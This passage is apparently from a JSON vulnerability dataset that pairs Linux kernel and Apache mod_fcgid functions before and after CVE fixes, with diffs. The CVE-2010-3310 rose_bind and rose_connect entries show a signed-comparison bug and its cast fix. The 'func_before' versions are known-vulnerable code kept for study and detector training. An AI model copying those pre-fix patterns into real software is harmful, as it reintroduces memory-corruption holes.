ext_pblock(&newex);\n\tallocated = ext4_ext_get_actual_len(&newex);\n\tif (allocated > max_blocks)\n\t\tallocated = max_blocks;\n\tset_buffer_new(bh_result);\n\n\t/*\n\t * Update reserved blocks/metadata blocks after successful\n\t * block allocation which had been deferred till now.\n\t */\n\tif (flags & EXT4_GET_BLOCKS_DELALLOC_RESERVE)\n\t\text4_da_update_reserve_space(inode, allocated, 1);\n\n\t/*\n\t * Cache the extent and update transaction to commit on fdatasync only\n\t * when it is _not_ an uninitialized extent.\n\t */\n\tif ((flags & EXT4_GET_BLOCKS_UNINIT_EXT) == 0) {\n\t\text4_ext_put_in_cache(inode, iblock, allocated, newblock,\n\t\t\t\t\t\tEXT4_EXT_CACHE_EXTENT);\n\t\text4_update_inode_fsync_trans(handle, inode, 1);\n\t} else\n\t\text4_update_inode_fsync_trans(handle, inode, 0);\nout:\n\tif (allocated > max_blocks)\n\t\tallocated = max_blocks;\n\text4_ext_show_leaf(inode, path);\n\tset_buffer_mapped(bh_result);\n\tbh_result->b_bdev = inode->i_sb->s_bdev;\n\tbh_result->b_blocknr = newblock;\nout2:\n\tif (path) {\n\t\text4_ext_drop_refs(path);\n\t\tkfree(path);\n\t}\n\treturn err ? err : allocated;\n}",
        "func": "int ext4_ext_get_blocks(handle_t *handle, struct inode *inode,\n\t\t\text4_lblk_t iblock,\n\t\t\tunsigned int max_blocks, struct buffer_head *bh_result,\n\t\t\tint flags)\n{\n\tstruct ext4_ext_path *path = NULL;\n\tstruct ext4_extent_header *eh;\n\tstruct ext4_extent newex, *ex, *last_ex;\n\text4_fsblk_t newblock;\n\tint err = 0, depth, ret, cache_type;\n\tunsigned int allocated = 0;\n\tstruct ext4_allocation_request ar;\n\text4_io_end_t *io = EXT4_I(inode)->cur_aio_dio;\n\n\t__clear_bit(BH_New, &bh_result->b_state);\n\text_debug(\"blocks %u/%u requested for inode %lu\\n\",\n\t\t\tiblock, max_blocks, inode->i_ino);\n\n\t/* check in cache */\n\tcache_type = ext4_ext_in_cache(inode, iblock, &newex);\n\tif (cache_type) {\n\t\tif (cache_type == EXT4_EXT_CACHE_GAP) {\n\t\t\tif ((flags & EXT4_GET_BLOCKS_CREATE) == 0) {\n\t\t\t\t/*\n\t\t\t\t * block isn't allocated yet and\n\t\t\t\t * user doesn't want to allocate it\n\t\t\t\t */\n\t\t\t\tgoto out2;\n\t\t\t}\n\t\t\t/* we should allocate requested block */\n\t\t} else if (cache_type == EXT4_EXT_CACHE_EXTENT) {\n\t\t\t/* block is already allocated */\n\t\t\tnewblock = iblock\n\t\t\t\t   - le32_to_cpu(newex.ee_block)\n\t\t\t\t   + ext_pblock(&newex);\n\t\t\t/* number of remaining blocks in the extent */\n\t\t\tallocated = ext4_ext_get_actual_len(&newex) -\n\t\t\t\t\t(iblock - le32_to_cpu(newex.ee_block));\n\t\t\tgoto out;\n\t\t} else {\n\t\t\tBUG();\n\t\t}\n\t}\n\n\t/* find extent for this block */\n\tpath = ext4_ext_find_extent(inode, iblock, NULL);\n\tif (IS_ERR(path)) {\n\t\terr = PTR_ERR(path);\n\t\tpath = NULL;\n\t\tgoto out2;\n\t}\n\n\tdepth = ext_depth(inode);\n\n\t/*\n\t * consistent leaf must not be empty;\n\t * this situation is possible, though, _during_ tree modification;\n\t * this is why assert can't be put in ext4_ext_find_extent()\n\t */\n\tif (unlikely(path[depth].p_ext == NULL && depth != 0)) {\n\t\tEXT4_ERROR_INODE(inode, \"bad extent address \"\n\t\t\t\t \"iblock: %d, depth: %d pblock %lld\",\n\t\t\t\t iblock, depth, path[depth].p_block);\n\t\terr = -EIO;\n\t\tgoto out2;\n\t}\n\teh = path[depth].p_hdr;\n\n\tex = path[depth].p_ext;\n\tif (ex) {\n\t\text4_lblk_t ee_block = le32_to_cpu(ex->ee_block);\n\t\text4_fsblk_t ee_start = ext_pblock(ex);\n\t\tunsigned short ee_len;\n\n\t\t/*\n\t\t * Uninitialized extents are treated as holes, except that\n\t\t * we split out initialized portions during a write.\n\t\t */\n\t\tee_len = ext4_ext_get_actual_len(ex);\n\t\t/* if found extent covers block, simply return it */\n\t\tif (in_range(iblock, ee_block, ee_len)) {\n\t\t\tnewblock = iblock - ee_block + ee_start;\n\t\t\t/* number of remaining blocks in the extent */\n\t\t\tallocated = ee_len - (iblock - ee_block);\n\t\t\text_debug(\"%u fit into %u:%d -> %llu\\n\", iblock,\n\t\t\t\t\tee_block, ee_len, newblock);\n\n\t\t\t/* Do not put uninitialized extent in the cache */\n\t\t\tif (!ext4_ext_is_uninitialized(ex)) {\n\t\t\t\text4_ext_put_in_cache(inode, ee_block,\n\t\t\t\t\t\t\tee_len, ee_start,\n\t\t\t\t\t\t\tEXT4_EXT_CACHE_EXTENT);\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tret = ext4_ext_handle_uninitialized_extents(handle,\n\t\t\t\t\tinode, iblock, max_blocks, path,\n\t\t\t\t\tflags, allocated, bh_result, newblock);\n\t\t\treturn ret;\n\t\t}\n\t}\n\n\t/*\n\t * requested block isn't allocated yet;\n\t * we couldn't try to create block if create flag is zero\n\t */\n\tif ((flags & EXT4_GET_BLOCKS_CREATE) == 0) {\n\t\t/*\n\t\t * put just found gap into cache to speed up\n\t\t * subsequent requests\n\t\t */\n\t\text4_ext_put_gap_in_cache(inode, path, iblock);\n\t\tgoto out2;\n\t}\n\t/*\n\t * Okay, we need to do block allocation.\n\t */\n\n\t/* find neighbour allocated blocks */\n\tar.lleft = iblock;\n\terr = ext4_ext_search_left(inode, path, &ar.lleft, &ar.pleft);\n\tif (err)\n\t\tgoto out2;\n\tar.lright = iblock;\n\terr = ext4_ext_search_right(inode, path, &ar.lright, &ar.pright);\n\tif (err)\n\t\tgoto out2;\n\n\t/*\n\t * See if request is beyond maximum number of blocks we can have in\n\t * a single extent. For an initialized extent this limit is\n\t * EXT_INIT_MAX_LEN and for an uninitialized extent this limit is\n\t * EXT_UNINIT_MAX_LEN.\n\t */\n\tif (max_blocks > EXT_INIT_MAX_LEN &&\n\t    !(flags & EXT4_GET_BLOCKS_UNINIT_EXT))\n\t\tmax_blocks = EXT_INIT_MAX_LEN;\n\telse if (max_blocks > EXT_UNINIT_MAX_LEN &&\n\t\t (flags & EXT4_GET_BLOCKS_UNINIT_EXT))\n\t\tmax_blocks = EXT_UNINIT_MAX_LEN;\n\n\t/* Check if we can really insert (iblock)::(iblock+max_blocks) extent */\n\tnewex.ee_block = cpu_to_le32(iblock);\n\tnewex.ee_len = cpu_to_le16(max_blocks);\n\terr = ext4_ext_check_overlap(inode, &newex, path);\n\tif (err)\n\t\tallocated = ext4_ext_get_actual_len(&newex);\n\telse\n\t\tallocated = max_blocks;\n\n\t/* allocate new block */\n\tar.inode = inode;\n\tar.goal = ext4_ext_find_goal(inode, path, iblock);\n\tar.logical = iblock;\n\tar.len = allocated;\n\tif (S_ISREG(inode->i_mode))\n\t\tar.flags = EXT4_MB_HINT_DATA;\n\telse\n\t\t/* disable in-core preallocation for non-regular files */\n\t\tar.flags = 0;\n\tnewblock = ext4_mb_new_blocks(handle, &ar, &err);\n\tif (!newblock)\n\t\tgoto out2;\n\text_debug(\"allocate new block: goal %llu, found %llu/%u\\n\",\n\t\t  ar.goal, newblock, allocated);\n\n\t/* try to insert new extent into found leaf and return */\n\text4_ext_store_pblock(&newex, newblock);\n\tnewex.ee_len = cpu_to_le16(ar.len);\n\t/* Mark uninitialized */\n\tif (flags & EXT4_GET_BLOCKS_UNINIT_EXT){\n\t\text4_ext_mark_uninitialized(&newex);\n\t\t/*\n\t\t * io_end structure was created for every IO write to an\n\t\t * uninitialized extent. To avoid unecessary conversion,\n\t\t * here we flag the IO that really needs the conversion.\n\t\t * For non asycn direct IO case, flag the inode state\n\t\t * that we need to perform convertion when IO is done.\n\t\t */\n\t\tif ((flags & EXT4_GET_BLOCKS_PRE_IO)) {\n\t\t\tif (io)\n\t\t\t\tio->flag = EXT4_IO_UNWRITTEN;\n\t\t\telse\n\t\t\t\text4_set_inode_state(inode,\n\t\t\t\t\t\t     EXT4_STATE_DIO_UNWRITTEN);\n\t\t}\n\t\tif (ext4_should_dioread_nolock(inode))\n\t\t\tset_buffer_uninit(bh_result);\n\t}\n\n\tif (unlikely(EXT4_I(inode)->i_flags & EXT4_EOFBLOCKS_FL)) {\n\t\tif (unlikely(!eh->eh_entries)) {\n\t\t\tEXT4_ERROR_INODE(inode,\n\t\t\t\t\t \"eh->eh_entries == 0 ee_block %d\",\n\t\t\t\t\t ex->ee_block);\n\t\t\terr = -EIO;\n\t\t\tgoto out2;\n\t\t}\n\t\tlast_ex = EXT_LAST_EXTENT(eh);\n\t\tif (iblock + ar.len > le32_to_cpu(last_ex->ee_block)\n\t\t    + ext4_ext_get_actual_len(last_ex))\n\t\t\tEXT4_I(inode)->i_flags &= ~EXT4_EOFBLOCKS_FL;\n\t}\n\terr = ext4_ext_insert_extent(handle, inode, path, &newex, flags);\n\tif (err) {\n\t\t/* free data blocks we just allocated */\n\t\t/* not a good idea to call discard here directly,\n\t\t * but otherwise we'd need to call it every free() */\n\t\text4_discard_preallocations(inode);\n\t\text4_free_blocks(handle, inode, 0, ext_pblock(&newex),\n\t\t\t\t ext4_ext_get_actual_len(&newex), 0);\n\t\tgoto out2;\n\t}\n\n\t/* previous routine could use block we allocated */\n\tnewblock = ext_pblock(&newex);\n\tallocated = ext4_ext_get_actual_len(&newex);\n\tif (allocated > max_blocks)\n\t\tallocated = max_blocks;\n\tset_buffer_new(bh_result);\n\n\t/*\n\t * Update reserved blocks/metadata blocks after successful\n\t * block allocation which had been deferred till now.\n\t */\n\tif (flags & EXT4_GET_BLOCKS_DELALLOC_RESERVE)\n\t\text4_da_update_reserve_space(inode, allocated, 1);\n\n\t/*\n\t * Cache the extent and update transaction to commit on fdatasync only\n\t * when it is _not_ an uninitialized extent.\n\t */\n\tif ((flags & EXT4_GET_BLOCKS_UNINIT_EXT) == 0) {\n\t\text4_ext_put_in_cache(inode, iblock, allocated, newblock,\n\t\t\t\t\t\tEXT4_EXT_CACHE_EXTENT);\n\t\text4_update_inode_fsync_trans(handle, inode, 1);\n\t} else\n\t\text4_update_inode_fsync_trans(handle, inode, 0);\nout:\n\tif (allocated > max_blocks)\n\t\tallocated = max_blocks;\n\text4_ext_show_leaf(inode, path);\n\tset_buffer_mapped(bh_result);\n\tbh_result->b_bdev = inode->i_sb->s_bdev;\n\tbh_result->b_blocknr = newblock;\nout2:\n\tif (path) {\n\t\text4_ext_drop_refs(path);\n\t\tkfree(path);\n\t}\n\treturn err ? err : allocated;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -78,7 +78,7 @@\n \t\t */\n \t\tee_len = ext4_ext_get_actual_len(ex);\n \t\t/* if found extent covers block, simply return it */\n-\t\tif (iblock >= ee_block && iblock < ee_block + ee_len) {\n+\t\tif (in_range(iblock, ee_block, ee_len)) {\n \t\t\tnewblock = iblock - ee_block + ee_start;\n \t\t\t/* number of remaining blocks in the extent */\n \t\t\tallocated = ee_len - (iblock - ee_block);",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tif (iblock >= ee_block && iblock < ee_block + ee_len) {"
            ],
            "added_lines": [
                "\t\tif (in_range(iblock, ee_block, ee_len)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-3310",
        "func_name": "kernel/git/netdev/net/rose_bind",
        "description": "Multiple integer signedness errors in net/rose/af_rose.c in the Linux kernel before 2.6.36-rc5-next-20100923 allow local users to cause a denial of service (heap memory corruption) or possibly have unspecified other impact via a rose_getname function call, related to the rose_bind and rose_connect functions.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/davem/net.git;a=commit;h=9828e6e6e3f19efcb476c567b9999891d051f52f",
        "commit_title": "Just use explicit casts, since we really can't change the",
        "commit_text": "types of structures exported to userspace which have been around for 15 years or so.  ",
        "func_before": "static int rose_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rose_sock *rose = rose_sk(sk);\n\tstruct sockaddr_rose *addr = (struct sockaddr_rose *)uaddr;\n\tstruct net_device *dev;\n\tax25_address *source;\n\tax25_uid_assoc *user;\n\tint n;\n\n\tif (!sock_flag(sk, SOCK_ZAPPED))\n\t\treturn -EINVAL;\n\n\tif (addr_len != sizeof(struct sockaddr_rose) && addr_len != sizeof(struct full_sockaddr_rose))\n\t\treturn -EINVAL;\n\n\tif (addr->srose_family != AF_ROSE)\n\t\treturn -EINVAL;\n\n\tif (addr_len == sizeof(struct sockaddr_rose) && addr->srose_ndigis > 1)\n\t\treturn -EINVAL;\n\n\tif (addr->srose_ndigis > ROSE_MAX_DIGIS)\n\t\treturn -EINVAL;\n\n\tif ((dev = rose_dev_get(&addr->srose_addr)) == NULL) {\n\t\tSOCK_DEBUG(sk, \"ROSE: bind failed: invalid address\\n\");\n\t\treturn -EADDRNOTAVAIL;\n\t}\n\n\tsource = &addr->srose_call;\n\n\tuser = ax25_findbyuid(current_euid());\n\tif (user) {\n\t\trose->source_call = user->call;\n\t\tax25_uid_put(user);\n\t} else {\n\t\tif (ax25_uid_policy && !capable(CAP_NET_BIND_SERVICE))\n\t\t\treturn -EACCES;\n\t\trose->source_call   = *source;\n\t}\n\n\trose->source_addr   = addr->srose_addr;\n\trose->device        = dev;\n\trose->source_ndigis = addr->srose_ndigis;\n\n\tif (addr_len == sizeof(struct full_sockaddr_rose)) {\n\t\tstruct full_sockaddr_rose *full_addr = (struct full_sockaddr_rose *)uaddr;\n\t\tfor (n = 0 ; n < addr->srose_ndigis ; n++)\n\t\t\trose->source_digis[n] = full_addr->srose_digis[n];\n\t} else {\n\t\tif (rose->source_ndigis == 1) {\n\t\t\trose->source_digis[0] = addr->srose_digi;\n\t\t}\n\t}\n\n\trose_insert_socket(sk);\n\n\tsock_reset_flag(sk, SOCK_ZAPPED);\n\tSOCK_DEBUG(sk, \"ROSE: socket is bound\\n\");\n\treturn 0;\n}",
        "func": "static int rose_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rose_sock *rose = rose_sk(sk);\n\tstruct sockaddr_rose *addr = (struct sockaddr_rose *)uaddr;\n\tstruct net_device *dev;\n\tax25_address *source;\n\tax25_uid_assoc *user;\n\tint n;\n\n\tif (!sock_flag(sk, SOCK_ZAPPED))\n\t\treturn -EINVAL;\n\n\tif (addr_len != sizeof(struct sockaddr_rose) && addr_len != sizeof(struct full_sockaddr_rose))\n\t\treturn -EINVAL;\n\n\tif (addr->srose_family != AF_ROSE)\n\t\treturn -EINVAL;\n\n\tif (addr_len == sizeof(struct sockaddr_rose) && addr->srose_ndigis > 1)\n\t\treturn -EINVAL;\n\n\tif ((unsigned int) addr->srose_ndigis > ROSE_MAX_DIGIS)\n\t\treturn -EINVAL;\n\n\tif ((dev = rose_dev_get(&addr->srose_addr)) == NULL) {\n\t\tSOCK_DEBUG(sk, \"ROSE: bind failed: invalid address\\n\");\n\t\treturn -EADDRNOTAVAIL;\n\t}\n\n\tsource = &addr->srose_call;\n\n\tuser = ax25_findbyuid(current_euid());\n\tif (user) {\n\t\trose->source_call = user->call;\n\t\tax25_uid_put(user);\n\t} else {\n\t\tif (ax25_uid_policy && !capable(CAP_NET_BIND_SERVICE))\n\t\t\treturn -EACCES;\n\t\trose->source_call   = *source;\n\t}\n\n\trose->source_addr   = addr->srose_addr;\n\trose->device        = dev;\n\trose->source_ndigis = addr->srose_ndigis;\n\n\tif (addr_len == sizeof(struct full_sockaddr_rose)) {\n\t\tstruct full_sockaddr_rose *full_addr = (struct full_sockaddr_rose *)uaddr;\n\t\tfor (n = 0 ; n < addr->srose_ndigis ; n++)\n\t\t\trose->source_digis[n] = full_addr->srose_digis[n];\n\t} else {\n\t\tif (rose->source_ndigis == 1) {\n\t\t\trose->source_digis[0] = addr->srose_digi;\n\t\t}\n\t}\n\n\trose_insert_socket(sk);\n\n\tsock_reset_flag(sk, SOCK_ZAPPED);\n\tSOCK_DEBUG(sk, \"ROSE: socket is bound\\n\");\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -20,7 +20,7 @@\n \tif (addr_len == sizeof(struct sockaddr_rose) && addr->srose_ndigis > 1)\n \t\treturn -EINVAL;\n \n-\tif (addr->srose_ndigis > ROSE_MAX_DIGIS)\n+\tif ((unsigned int) addr->srose_ndigis > ROSE_MAX_DIGIS)\n \t\treturn -EINVAL;\n \n \tif ((dev = rose_dev_get(&addr->srose_addr)) == NULL) {",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (addr->srose_ndigis > ROSE_MAX_DIGIS)"
            ],
            "added_lines": [
                "\tif ((unsigned int) addr->srose_ndigis > ROSE_MAX_DIGIS)"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-3310",
        "func_name": "kernel/git/netdev/net/rose_connect",
        "description": "Multiple integer signedness errors in net/rose/af_rose.c in the Linux kernel before 2.6.36-rc5-next-20100923 allow local users to cause a denial of service (heap memory corruption) or possibly have unspecified other impact via a rose_getname function call, related to the rose_bind and rose_connect functions.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/davem/net.git;a=commit;h=9828e6e6e3f19efcb476c567b9999891d051f52f",
        "commit_title": "Just use explicit casts, since we really can't change the",
        "commit_text": "types of structures exported to userspace which have been around for 15 years or so.  ",
        "func_before": "static int rose_connect(struct socket *sock, struct sockaddr *uaddr, int addr_len, int flags)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rose_sock *rose = rose_sk(sk);\n\tstruct sockaddr_rose *addr = (struct sockaddr_rose *)uaddr;\n\tunsigned char cause, diagnostic;\n\tstruct net_device *dev;\n\tax25_uid_assoc *user;\n\tint n, err = 0;\n\n\tif (addr_len != sizeof(struct sockaddr_rose) && addr_len != sizeof(struct full_sockaddr_rose))\n\t\treturn -EINVAL;\n\n\tif (addr->srose_family != AF_ROSE)\n\t\treturn -EINVAL;\n\n\tif (addr_len == sizeof(struct sockaddr_rose) && addr->srose_ndigis > 1)\n\t\treturn -EINVAL;\n\n\tif (addr->srose_ndigis > ROSE_MAX_DIGIS)\n\t\treturn -EINVAL;\n\n\t/* Source + Destination digis should not exceed ROSE_MAX_DIGIS */\n\tif ((rose->source_ndigis + addr->srose_ndigis) > ROSE_MAX_DIGIS)\n\t\treturn -EINVAL;\n\n\tlock_sock(sk);\n\n\tif (sk->sk_state == TCP_ESTABLISHED && sock->state == SS_CONNECTING) {\n\t\t/* Connect completed during a ERESTARTSYS event */\n\t\tsock->state = SS_CONNECTED;\n\t\tgoto out_release;\n\t}\n\n\tif (sk->sk_state == TCP_CLOSE && sock->state == SS_CONNECTING) {\n\t\tsock->state = SS_UNCONNECTED;\n\t\terr = -ECONNREFUSED;\n\t\tgoto out_release;\n\t}\n\n\tif (sk->sk_state == TCP_ESTABLISHED) {\n\t\t/* No reconnect on a seqpacket socket */\n\t\terr = -EISCONN;\n\t\tgoto out_release;\n\t}\n\n\tsk->sk_state   = TCP_CLOSE;\n\tsock->state = SS_UNCONNECTED;\n\n\trose->neighbour = rose_get_neigh(&addr->srose_addr, &cause,\n\t\t\t\t\t &diagnostic, 0);\n\tif (!rose->neighbour) {\n\t\terr = -ENETUNREACH;\n\t\tgoto out_release;\n\t}\n\n\trose->lci = rose_new_lci(rose->neighbour);\n\tif (!rose->lci) {\n\t\terr = -ENETUNREACH;\n\t\tgoto out_release;\n\t}\n\n\tif (sock_flag(sk, SOCK_ZAPPED)) {\t/* Must bind first - autobinding in this may or may not work */\n\t\tsock_reset_flag(sk, SOCK_ZAPPED);\n\n\t\tif ((dev = rose_dev_first()) == NULL) {\n\t\t\terr = -ENETUNREACH;\n\t\t\tgoto out_release;\n\t\t}\n\n\t\tuser = ax25_findbyuid(current_euid());\n\t\tif (!user) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto out_release;\n\t\t}\n\n\t\tmemcpy(&rose->source_addr, dev->dev_addr, ROSE_ADDR_LEN);\n\t\trose->source_call = user->call;\n\t\trose->device      = dev;\n\t\tax25_uid_put(user);\n\n\t\trose_insert_socket(sk);\t\t/* Finish the bind */\n\t}\nrose_try_next_neigh:\n\trose->dest_addr   = addr->srose_addr;\n\trose->dest_call   = addr->srose_call;\n\trose->rand        = ((long)rose & 0xFFFF) + rose->lci;\n\trose->dest_ndigis = addr->srose_ndigis;\n\n\tif (addr_len == sizeof(struct full_sockaddr_rose)) {\n\t\tstruct full_sockaddr_rose *full_addr = (struct full_sockaddr_rose *)uaddr;\n\t\tfor (n = 0 ; n < addr->srose_ndigis ; n++)\n\t\t\trose->dest_digis[n] = full_addr->srose_digis[n];\n\t} else {\n\t\tif (rose->dest_ndigis == 1) {\n\t\t\trose->dest_digis[0] = addr->srose_digi;\n\t\t}\n\t}\n\n\t/* Move to connecting socket, start sending Connect Requests */\n\tsock->state   = SS_CONNECTING;\n\tsk->sk_state     = TCP_SYN_SENT;\n\n\trose->state = ROSE_STATE_1;\n\n\trose->neighbour->use++;\n\n\trose_write_internal(sk, ROSE_CALL_REQUEST);\n\trose_start_heartbeat(sk);\n\trose_start_t1timer(sk);\n\n\t/* Now the loop */\n\tif (sk->sk_state != TCP_ESTABLISHED && (flags & O_NONBLOCK)) {\n\t\terr = -EINPROGRESS;\n\t\tgoto out_release;\n\t}\n\n\t/*\n\t * A Connect Ack with Choke or timeout or failed routing will go to\n\t * closed.\n\t */\n\tif (sk->sk_state == TCP_SYN_SENT) {\n\t\tDEFINE_WAIT(wait);\n\n\t\tfor (;;) {\n\t\t\tprepare_to_wait(sk_sleep(sk), &wait,\n\t\t\t\t\tTASK_INTERRUPTIBLE);\n\t\t\tif (sk->sk_state != TCP_SYN_SENT)\n\t\t\t\tbreak;\n\t\t\tif (!signal_pending(current)) {\n\t\t\t\trelease_sock(sk);\n\t\t\t\tschedule();\n\t\t\t\tlock_sock(sk);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\terr = -ERESTARTSYS;\n\t\t\tbreak;\n\t\t}\n\t\tfinish_wait(sk_sleep(sk), &wait);\n\n\t\tif (err)\n\t\t\tgoto out_release;\n\t}\n\n\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t/* Try next neighbour */\n\t\trose->neighbour = rose_get_neigh(&addr->srose_addr, &cause, &diagnostic, 0);\n\t\tif (rose->neighbour)\n\t\t\tgoto rose_try_next_neigh;\n\n\t\t/* No more neighbours */\n\t\tsock->state = SS_UNCONNECTED;\n\t\terr = sock_error(sk);\t/* Always set at this point */\n\t\tgoto out_release;\n\t}\n\n\tsock->state = SS_CONNECTED;\n\nout_release:\n\trelease_sock(sk);\n\n\treturn err;\n}",
        "func": "static int rose_connect(struct socket *sock, struct sockaddr *uaddr, int addr_len, int flags)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rose_sock *rose = rose_sk(sk);\n\tstruct sockaddr_rose *addr = (struct sockaddr_rose *)uaddr;\n\tunsigned char cause, diagnostic;\n\tstruct net_device *dev;\n\tax25_uid_assoc *user;\n\tint n, err = 0;\n\n\tif (addr_len != sizeof(struct sockaddr_rose) && addr_len != sizeof(struct full_sockaddr_rose))\n\t\treturn -EINVAL;\n\n\tif (addr->srose_family != AF_ROSE)\n\t\treturn -EINVAL;\n\n\tif (addr_len == sizeof(struct sockaddr_rose) && addr->srose_ndigis > 1)\n\t\treturn -EINVAL;\n\n\tif ((unsigned int) addr->srose_ndigis > ROSE_MAX_DIGIS)\n\t\treturn -EINVAL;\n\n\t/* Source + Destination digis should not exceed ROSE_MAX_DIGIS */\n\tif ((rose->source_ndigis + addr->srose_ndigis) > ROSE_MAX_DIGIS)\n\t\treturn -EINVAL;\n\n\tlock_sock(sk);\n\n\tif (sk->sk_state == TCP_ESTABLISHED && sock->state == SS_CONNECTING) {\n\t\t/* Connect completed during a ERESTARTSYS event */\n\t\tsock->state = SS_CONNECTED;\n\t\tgoto out_release;\n\t}\n\n\tif (sk->sk_state == TCP_CLOSE && sock->state == SS_CONNECTING) {\n\t\tsock->state = SS_UNCONNECTED;\n\t\terr = -ECONNREFUSED;\n\t\tgoto out_release;\n\t}\n\n\tif (sk->sk_state == TCP_ESTABLISHED) {\n\t\t/* No reconnect on a seqpacket socket */\n\t\terr = -EISCONN;\n\t\tgoto out_release;\n\t}\n\n\tsk->sk_state   = TCP_CLOSE;\n\tsock->state = SS_UNCONNECTED;\n\n\trose->neighbour = rose_get_neigh(&addr->srose_addr, &cause,\n\t\t\t\t\t &diagnostic, 0);\n\tif (!rose->neighbour) {\n\t\terr = -ENETUNREACH;\n\t\tgoto out_release;\n\t}\n\n\trose->lci = rose_new_lci(rose->neighbour);\n\tif (!rose->lci) {\n\t\terr = -ENETUNREACH;\n\t\tgoto out_release;\n\t}\n\n\tif (sock_flag(sk, SOCK_ZAPPED)) {\t/* Must bind first - autobinding in this may or may not work */\n\t\tsock_reset_flag(sk, SOCK_ZAPPED);\n\n\t\tif ((dev = rose_dev_first()) == NULL) {\n\t\t\terr = -ENETUNREACH;\n\t\t\tgoto out_release;\n\t\t}\n\n\t\tuser = ax25_findbyuid(current_euid());\n\t\tif (!user) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto out_release;\n\t\t}\n\n\t\tmemcpy(&rose->source_addr, dev->dev_addr, ROSE_ADDR_LEN);\n\t\trose->source_call = user->call;\n\t\trose->device      = dev;\n\t\tax25_uid_put(user);\n\n\t\trose_insert_socket(sk);\t\t/* Finish the bind */\n\t}\nrose_try_next_neigh:\n\trose->dest_addr   = addr->srose_addr;\n\trose->dest_call   = addr->srose_call;\n\trose->rand        = ((long)rose & 0xFFFF) + rose->lci;\n\trose->dest_ndigis = addr->srose_ndigis;\n\n\tif (addr_len == sizeof(struct full_sockaddr_rose)) {\n\t\tstruct full_sockaddr_rose *full_addr = (struct full_sockaddr_rose *)uaddr;\n\t\tfor (n = 0 ; n < addr->srose_ndigis ; n++)\n\t\t\trose->dest_digis[n] = full_addr->srose_digis[n];\n\t} else {\n\t\tif (rose->dest_ndigis == 1) {\n\t\t\trose->dest_digis[0] = addr->srose_digi;\n\t\t}\n\t}\n\n\t/* Move to connecting socket, start sending Connect Requests */\n\tsock->state   = SS_CONNECTING;\n\tsk->sk_state     = TCP_SYN_SENT;\n\n\trose->state = ROSE_STATE_1;\n\n\trose->neighbour->use++;\n\n\trose_write_internal(sk, ROSE_CALL_REQUEST);\n\trose_start_heartbeat(sk);\n\trose_start_t1timer(sk);\n\n\t/* Now the loop */\n\tif (sk->sk_state != TCP_ESTABLISHED && (flags & O_NONBLOCK)) {\n\t\terr = -EINPROGRESS;\n\t\tgoto out_release;\n\t}\n\n\t/*\n\t * A Connect Ack with Choke or timeout or failed routing will go to\n\t * closed.\n\t */\n\tif (sk->sk_state == TCP_SYN_SENT) {\n\t\tDEFINE_WAIT(wait);\n\n\t\tfor (;;) {\n\t\t\tprepare_to_wait(sk_sleep(sk), &wait,\n\t\t\t\t\tTASK_INTERRUPTIBLE);\n\t\t\tif (sk->sk_state != TCP_SYN_SENT)\n\t\t\t\tbreak;\n\t\t\tif (!signal_pending(current)) {\n\t\t\t\trelease_sock(sk);\n\t\t\t\tschedule();\n\t\t\t\tlock_sock(sk);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\terr = -ERESTARTSYS;\n\t\t\tbreak;\n\t\t}\n\t\tfinish_wait(sk_sleep(sk), &wait);\n\n\t\tif (err)\n\t\t\tgoto out_release;\n\t}\n\n\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t/* Try next neighbour */\n\t\trose->neighbour = rose_get_neigh(&addr->srose_addr, &cause, &diagnostic, 0);\n\t\tif (rose->neighbour)\n\t\t\tgoto rose_try_next_neigh;\n\n\t\t/* No more neighbours */\n\t\tsock->state = SS_UNCONNECTED;\n\t\terr = sock_error(sk);\t/* Always set at this point */\n\t\tgoto out_release;\n\t}\n\n\tsock->state = SS_CONNECTED;\n\nout_release:\n\trelease_sock(sk);\n\n\treturn err;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,7 +17,7 @@\n \tif (addr_len == sizeof(struct sockaddr_rose) && addr->srose_ndigis > 1)\n \t\treturn -EINVAL;\n \n-\tif (addr->srose_ndigis > ROSE_MAX_DIGIS)\n+\tif ((unsigned int) addr->srose_ndigis > ROSE_MAX_DIGIS)\n \t\treturn -EINVAL;\n \n \t/* Source + Destination digis should not exceed ROSE_MAX_DIGIS */",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (addr->srose_ndigis > ROSE_MAX_DIGIS)"
            ],
            "added_lines": [
                "\tif ((unsigned int) addr->srose_ndigis > ROSE_MAX_DIGIS)"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-3872",
        "func_name": "apache/httpd-mod_fcgid/fcgid_header_bucket_read",
        "description": "A flaw was found in the mod_fcgid module of httpd. A malformed FastCGI response may result in a stack-based buffer overflow in the modules/fcgid/fcgid_bucket.c file in the fcgid_header_bucket_read() function, resulting in an application crash.",
        "git_url": "https://github.com/apache/httpd-mod_fcgid/commit/b1afa70840b4ab4e6fbc12ac8798b2f3ccc336b2",
        "commit_title": "SECURITY: CVE-2010-3872 (cve.mitre.org)",
        "commit_text": " Fix possible stack buffer overwrite.  PR:  49406 Reported and diagnosed by: Edgar Frank <ef-lists email.de>  ",
